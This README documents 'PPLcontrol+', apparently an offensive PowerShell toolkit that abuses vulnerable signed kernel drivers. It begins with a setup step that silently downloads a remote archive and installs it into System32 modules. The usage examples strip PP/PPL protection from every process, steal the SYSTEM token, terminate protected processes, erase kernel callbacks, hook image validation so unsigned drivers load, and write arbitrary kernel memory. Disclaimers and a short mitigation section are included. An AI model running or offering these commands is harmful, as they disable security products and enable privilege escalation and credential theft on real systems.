# PPLcontrol+ (PowerShell Version)

A PowerShell-based toolkit for interacting with Windows Protected Process Light (PPL) and Protected Process (PP) mechanisms through kernel driver interfaces.

The tool provides functionality for inspecting and modifying process protection attributes, allowing researchers to query, elevate, downgrade, or remove PP/PPL protections from running processes. Additional capabilities include protected process termination, token manipulation, callback enumeration and removal, and kernel memory mapping for advanced Windows internals research.

Designed for security research, malware analysis, reverse engineering, red team laboratory environments, and educational exploration of Windows process protection technologies.

---
## ⚙️ Prerequisites & Setup

1. **Must install the latest library:** The script leverages kernel drivers to interact with process structures. and need to use the latest Ps1.Lib, to do it.

````powershell
try {
        $repoUrl = "https://github.com/v8k6b2jjps-prog/Unmanaged.PS1.Library/archive/refs/heads/main.zip"
        $moduleFolder = "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\NativeInteropLib"
        $tempFolder = "$env:TEMP\Unmanaged.PS1.Library"
        $zipFile = "$tempFolder.zip"

        Invoke-WebRequest -Uri $repoUrl -OutFile $zipFile
        Expand-Archive -Path $zipFile -DestinationPath $tempFolder -Force
        if (-not (Test-Path $moduleFolder)) { New-Item -Path $moduleFolder -ItemType Directory }
        Copy-Item -Path "$tempFolder\Unmanaged.PS1.Library-main\*" -Destination $moduleFolder -Recurse -Force | Out-Null
        Remove-Item -Path $zipFile -Force | Out-Null
        Remove-Item -Path $tempFolder -Recurse -Force | Out-Null
    } catch {
    }

````
2. **Service Cleanup:** The script leverages kernel drivers to interact with process structures. Ensure you remove the associated services after use. You can clean up known vulnerable/utilized drivers using the command below:

```powershell
 $TempDir   = $env:TEMP
 $SourceDir = "$env:windir\System32"

 $Binary =  "EchoDrv", "echo_driver", "BdApiUtil", "CardIo64", 
            "bootrepair", "GoFly", "GoFly64", "wsftprm", "dpmemio",
            "RTCore", "RTCore64", "ipctype", "mtxvxd", "Astra64",
            "mtxC9CB", "BiosToolCommonDriver", "PoisonX",
            "ControlCenter", "CCDRV1", "CorMem", "portwell",
            "PORTWELL_0_1", "hp64vision", "hpvision0", "iobios",
            "6c8a", "TdkLib", "GibEpExt", "GibEpFirmware", "CardIo",
            "LECOMAx64", "LECOMA64_2", "AIDA64Driver", "Lallamon",
            "wdisvhost", "PhyMem", "watabe", "wamsdk", "amsdk",
            "mst", "KmWpsMs", "AppVkgr", "mst64_4.20.0", "KPRL",
            "WinIo64", "WinIo", "safezone04", "STProcessMonitorDriver",
            "STProcessMonitor", "HwRwDrv", "HwRw", "iobios64", 
            "DevMem", "PGRHostControl", "ASMMAP64", "shield", "shield-async",
            "shieldwp", "EAZShield", "TcIo", "DDDriver", "DELLWALDOS", 
            "HWAuidoOs2Ec", "HWAudioDevX64", "d591004", "d41cf5ba", 
            "mtxmem", "mtxmemmanager", "PMAD", "NTPMAD", "PDFWKRNL",
			"AdvCare", "ArgusMonitor", "biontdrv", "CmUpx", "DDDriver", 
			"FoxKeDriver64", "lsigetwin_SliffDriver", "MemCtl", "nxeng",
			"Fox_FOXONE_Driver", "DELLWAL", "SliffDriver", "ArgusMonitorCTLD",
            "ArgusMonitorCTL", "ProcessCtr", "GGProtect64", "GGProtect",
            "ksapi", "ksapi64_dev", "PDFWKRNL", "TPwSav", "WDTKernel",
            "EBIoDispatch"

 $Binary | % {
    $DriverPath = Join-Path -Path $SourceDir -ChildPath "$_.sys"
    $DestPath   = Join-Path -Path $TempDir   -ChildPath ([guid]::NewGuid().ToString())
    if($_ -match 'GGProtect') {
        $RegPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$_"
        if (Test-Path $RegPath) {
            Set-ItemProperty -Path $RegPath -Name "Start" -Value 4 -ea 0
        }
        if (Test-Path $DriverPath) {
            Move-Item -Path $DriverPath -Destination $DestPath -Force -ea 0
        }
    } else {
        Stop-Service -Name $_ -ea 0
        sc.exe delete $_ | Out-Null
        if (Test-Path $DriverPath) {
          Move-Item -Path $DriverPath -Destination $DestPath -Force -ea 0
        }
    }
 }
```
---

## ⚖️ Legal Notice & Educational Disclaimer

### Educational Purpose Only
This repository and the code contained herein are intended strictly for academic research, authorized security auditing, and educational demonstrations regarding Windows kernel architecture and memory management. It is designed to help security professionals, researchers, and systems engineers understand the mechanics of process protection models and driver-based memory interactions.

### Authorized Testing Limits
This utility must only be executed on systems where the user has explicit, documented permission to perform low-level security testing, such as personally owned hardware or dedicated corporate testing ranges. Running this software on unauthorized production systems or infrastructure without proper consent is strictly prohibited and may violate local and international computer misuse laws.

### Limitation of Liability
The author assumes no liability for any misuse of this project, data loss, system corruption, or hardware instability resulting from the execution of this script. Modifying active kernel structures carries inherent system risks (such as Bug Checks / BSOD), and users proceed entirely at their own discretion.

---

## 🔬 Proof of Concept & Research Context

### Understanding Windows Process Protection
Windows introduces Protected Process (PP) and Protected Process Light (PPL) mechanisms to prevent user-mode processes—even those running with administrative privileges (`nt authority\system`)—from tampering with critical system tasks (such as LSASS or anti-malware services). This protection is enforced by flags residing within the kernel-level `EPROCESS` structure of each process.

### The BYOVD Research Context
This tool serves as an educational proof of concept demonstrating how arbitrary read/write features in legacy or signed kernel drivers can be analyzed to locate and patch the `_PS_PROTECTION` field of an arbitrary process. 

#### Conceptual Workflow:
1. **Driver Loading:** A legitimate, signed third-party driver containing an arbitrary memory mapping or access utility is loaded into kernel space.
2. **Structure Discovery:** The tool locates the active process list and navigates to the target process's `EPROCESS` structure.
3. **Memory Modification:** The tool overwrites the `Type` (3 bits) and `Signer` (4 bits) values inside the `_PS_PROTECTION` byte structure to dynamically alter or strip process safeguards for analysis.

---

## 🛡️ Safe Lab Deployment & Mitigation

To ensure safe usage and prevent accidental system instability or security exposure during testing, adhere to the following guidelines:

### Isolated Lab Environment
* **Virtualization Only:** Execute this script exclusively within isolated development environments or virtual machines (e.g., Windows Sandbox, Hyper-V, or VMware) with no production network connectivity.
* **Snapshotting:** Take a clean system snapshot prior to loading drivers or mapping virtual addresses. Kernel manipulation carries a risk of generating Bug Checks (BSOD).

### Defensive Mitigations
To protect systems against unauthorized driver loading and the exploitation vectors demonstrated by this PoC:
* **Driver Blocklist:** Ensure Microsoft Recommended Driver Blocklist or Windows Defender Application Control (WDAC) is enabled to block known legacy versions of drivers.
* **Credential Guard:** Enable Virtualization-Based Security (VBS) and Credential Guard to protect underlying identity structures regardless of local process manipulation.

---

## 💻 Usage Demos

### 1. Update Protection by Process ID (PID)
Modify a specific process's protection level to `PPL` with an `Antimalware` signer.
```powershell
Query-EprocessStruct -ProcessID 832 | ForEach-Object { 
    Update-ProcessProtection -Eprocess $_ -SignerValue Antimalware -TypeValue PPL 
}
```

### 2. Remove Protection From All Active Processes
Iterate through all active processes and strip away any active PP/PPL protection.
```powershell
Clear-Host
Write-Host
$Query = Query-EprocessStruct
$Eprocess = $Query | % { ConvertFrom-EprocessStruct -EprocessBase $_  -IgnoreDirectoryTable -IgnoreToken }
$Eprocess | % {
    if ($_.ProtectionType -and $_.ProtectionType -ne 'None') {
        $EprocessBase = [IntPtr][Convert]::ToInt64($_.EprocessAddress, 16)
        Update-ProcessProtection -Eprocess $EprocessBase -SignerValue None -TypeValue None
    }
}
```

### 3. Query Protection From All Active Process
Display a formatted table showing the protection type, signer status, and `EPROCESS` memory address for all running processes.
```powershell
Clear-Host
Write-Host ""

$Query = Query-EprocessStruct
# Filter out only invalid/ghost records so we catch all active processes
$Eprocess = $Query | % { ConvertFrom-EprocessStruct -EprocessBase $_ } | ? { $null -ne $_.ProcessID }

if ($null -ne $Eprocess) {

    # Expanded Layout Spacing to accommodate CR3 Physical Memory bases cleanly
    $FormatStr = "{0,-6} {1,-18} {2,-19} {3,-19} {4,-19} {5,-19} {6}"
    
    # 1. Header Layout
    Write-Host ($FormatStr -f `
        "PID", "Protection", "Eprocess Addr", "Token Addr", "Kernel CR3 Base", "User CR3 Base", "Image Name"
    ) -ForegroundColor Cyan

    Write-Host ($FormatStr -f `
        "---", "----------", "-------------", "----------", "---------------", "-------------", "----------"
    ) -ForegroundColor Cyan

    # 2. Data Rows
    foreach ($Process in $Eprocess) {

        # Format Protection string nicely
        $ProtectionDisplay = if ($Process.ProtectionType -ne "None") {
            "{0}({1})" -f $Process.ProtectionType, $Process.ProtectionSigner
        }
        else {
            "None"
        }

        # Render rows dynamically matching the newly expanded CR3 template columns
        Write-Host ($FormatStr -f `
            $Process.ProcessID,
            $ProtectionDisplay,
            $Process.EprocessAddress,
            $Process.TokenAddress,
            $Process.KernelPhysicalAddress,
            $Process.UserPhysicalAddress,
            $Process.ProcessName
        ) -ForegroundColor Yellow
    }
    Write-Host ""
}
```

### 4. Terminate a Protected Process
Elevate a process (e.g., Notepad) to `PP` (`WinTcb`) and demonstrate termination using a user-mode utility versus a kernel-mode driver command.
```powershell
$processID = Start-Process -FilePath Notepad -WindowStyle Normal -PassThru | select -ExpandProperty Id
Query-EprocessStruct -ProcessID $ProcessID | % { Update-ProcessProtection -Eprocess $_ -SignerValue WinTcb -TypeValue PP } | Out-Null
# Ring 3 Kill
Start-Sleep -Seconds 1
tskill /a notepad
# Ring 0 Kill
Start-Sleep -Seconds 1
Invoke-ShadowSsdtHookKill -PROCID $ProcessID
Terminate-SystemProcess -ProcessID $ProcessID -DriverName BdApiUtil
Terminate-KernelProcess -ProcID $ProcessID -Driver d591004
```

### 5. Duplicate a SYSTEM Process Token
Duplicate the access token of PID 4 (SYSTEM) and assign it to another process.
```powershell
Invoke-TokenSteal -CurrentProcess
Invoke-TokenSteal -FilePath cmd -Args "/k whoami"
Invoke-TokenSteal -TargetPID 1223
```

### 6. Manage Process Callbacks
Enumerate registered process callbacks or remove a specific callback entry.
```powershell
Get-RegistryCallbacks     # Erase Not supported
Get-ObRegisterCallback    # -Slot 'cmdguard.sys' -Erase
Get-LoadImageCallbacks    # -Slot 0 -Erase
Get-CreateThreadCallbacks # -Slot 0 -Erase
Get-CreateProcessCallback # -Slot 6 -Erase
```

### 7. g_CiOptions Information

Retrieve the `g_CiOptions` address dynamically and decode the active `CodeIntegrityOptions` flags.

> [!WARNING]
> `g_CiOptions` resides in protected kernel memory. Reading its value is generally safe; however, writing to this address can trigger a system crash (BSOD), particularly on systems protected by VBS, HVCI (Memory Integrity), or other modern kernel security mechanisms.
>
> This example is intended for **inspection and enumeration only**. Do **not** modify `g_CiOptions` unless you fully understand the implications and have intentionally disabled the relevant protections.

```powershell
$g_CiOptions = Get-gCiOptionsAddress #-g_CiOptions 0x00000001C00391B0
if ($g_CiOptions -ne $null) {
  $CiOptions = Read-VirtualAddress -VA $g_CiOptions -AsInt
  Get-EnumFlags -EnumType 'CodeIntegrityOptions' -Value $CiOptions | Format-Table
}
````
### 8. SeValidateImageHeaderHook

Retrieve the `SeValidateImageHeader` address dynamically and Hook it, to allow load Un Sigen Driver's.

> [!WARNING]
> On Windows builds 22000 and higher, particularly when VBS (Virtualization-Based Security) or HVCI (Memory Integrity) is enabled,
> any attempt to hook or modify protected kernel memory structures will likely trigger a system crash (BSOD).
> This risk is significantly heightened during the driver load process, as the kernel actively monitors and validates integrity before executing the hooked function.
>

```powershell
Clear-Host
Write-Host

Invoke-SeValidateImageHeaderHook -Install
Write-Host

Invoke-SeValidateImageHeaderHook -Remove
Write-Host
````
### 9. Spoof NT Build Number

Modify the reported NT build number across three system layers: Registry, KUSER_SHARED_DATA, and Kernel.

Warning: Improper use can cause BSODs on Windows 11 and may trigger unintended Windows Update behavior (e.g., attempting to fetch Windows 11 feature updates on Windows 10).

````powershell
# Spoof build number across all levels (Registry, Kernel, KUser)
Spoof-NtBuildNumber -NewBuildNumber 26000

# Spoof specific layer
Spoof-NtBuildNumber -NewBuildNumber 26000 -SpoofLevel Kernel
Spoof-NtBuildNumber -NewBuildNumber 26000 -SpoofLevel KUser
Spoof-NtBuildNumber -NewBuildNumber 26000 -SpoofLevel Registry
````
### 10. Get-KernelThreadList

Forensically extracts active kernel-mode thread objects (ETHREAD) from the system memory. 

Targeting: EPROCESS-to-ETHREAD linkage traversal.

Usage:
Get-KernelThreadList -ProcessId <Int32> -Verbose

Output Schema:

````
Index ProcessName    PETHREAD_Address   ThreadID IsMainThread PreviousMode PreviousAddress    Flink_Pointer           CreateTimeRaw      CreateTimeValue
----- -----------    ----------------   -------- ------------ ------------ ---------------    -------------           -------------      ---------------
    1 powershell_ise 0xFFFFC3823EEAA080   5656         True 1 (UserMode) 0xFFFFC3823EEAA2B2 0xFFFFC3823EEAA568 134261727195048761 17/06/2026 15:25:19.504
    2 powershell_ise 0xFFFFC3823FFE6080   4780        False 1 (UserMode) 0xFFFFC3823FFE62B2 0xFFFFC3823FFE6568 134261727195120853 17/06/2026 15:25:19.512
````
### 11. Ssdt Callback Hijack
hijack NT Kernel Address, And invoke it From user Mode, Work Only in build < 22000
```powershell
Clear-Host
Write-Host

$KernelVA = Get-KernelBaseAddress
"VA: 0x{0:X16}" -f [Int64]$KernelVA

$Values = $KernelVA, 0L
$PA = Invoke-SsdtCallbackHijack `
    -Function MmGetPhysicalAddress `
    -Values $Values
if ($PA -notin @(0,1)) {
    "PA: 0x{0:X16}" -f $PA
}

Write-Host
return
```
### 12. Hardware-vs-Software-MemoryBridge
A side-by-side comparison of manual page table walking versus standard API memory acquisition
```powershell
Clear-Host
Write-Host

$ProcID = [Marshal]::ReadInt64((NtCurrentTeb -ClientID))
$Handle = New-IntPtr -Size 8 -InitialValue 99 -UsePointerSize

Write-Host '# Using Walker' -ForegroundColor Magenta
$HandleAddress = [BitConverter]::ToUInt64([BitConverter]::GetBytes($Handle.ToInt64()), 0)
$PhysicalAddress = Resolve-DirectoryTable -VA $HandleAddress -ProcessID $ProcID
Get-UnsignedPhysical -Address $PhysicalAddress -Size 8 -OutBytes     | Format-HexView -Mode 4x

Write-Host
Write-Host '# Using API' -ForegroundColor Magenta
Invoke-MemoryRead -ProcessId $ProcID -Address $Handle -BytesToRead 8 | Format-HexView -Mode 4x

Write-Host

$ProcID = 4
$Handle = Get-KernelBaseAddress

Write-Host '# Using Walker' -ForegroundColor Magenta
$KernelBaseAddress64 = [BitConverter]::ToUInt64([BitConverter]::GetBytes($Handle.ToInt64()), 0)
$PhysicalAddress = Resolve-DirectoryTable -VA $KernelBaseAddress64 -ProcessID $ProcID
Get-UnsignedPhysical -Address $PhysicalAddress -Size 96 -OutBytes | Format-HexView -Mode 16x

Write-Host
Write-Host '# Using Driver/API' -ForegroundColor Magenta
Read-VirtualAddress -VA $Handle -BlockSize 96 | Format-HexView -Mode 16x
```
### 13. Kernel Memory Operations

Perform read and write operations on physical memory addresses using various driver-specific implementations. 

The following functions are supported: // Most Function Support Both VA/PA Address, Default is VA

| Driver / Interface | Read Function | Write Function |
| :--- | :--- | :--- |
| BiosToolCommonDriver / gibepext | Read-KernelMemory | Write-KernelMemory |
| ControlCenter / PORTWELL / CorMem | Read-KernelAddress | Write-KernelAddress |
| hp64vision / CorMem | Read-PhysicalMemory | Write-PhysicalMemory |
| Phoenix 6c8a / CorMem | Read-PhysicalAddress | Write-PhysicalAddress |
| shield, shield-async, shieldwp | Read-VirtualAddress | Write-VirtualAddress |
| CmUpx, AdvCare, pcdsrvc, AsrDrv | Invoke-MemoryOperation | Invoke-MemoryOperation |

---

## 🤝 Credits & References

This project builds upon research, concepts, and tools created by the following security researchers:

* **AI** for the dynamic approach, Callbacks address Tracing
* **j3h4ck** for [PPLShade](https://github.com/redteamfortress/PPLShade)
* **itm4n** for the original C++ tool [PPLcontrol](https://github.com/itm4n/PPLcontrol)
* **[@aceb0nd](https://twitter.com/aceb0nd)** for [PPLKiller](https://github.com/RedCursorSecurityConsulting/PPLKiller)
* **[@aionescu](https://twitter.com/aionescu)** for the research series: [Protected Processes Part 3: Windows PKI Internals](https://www.alex-ionescu.com/?p=146)
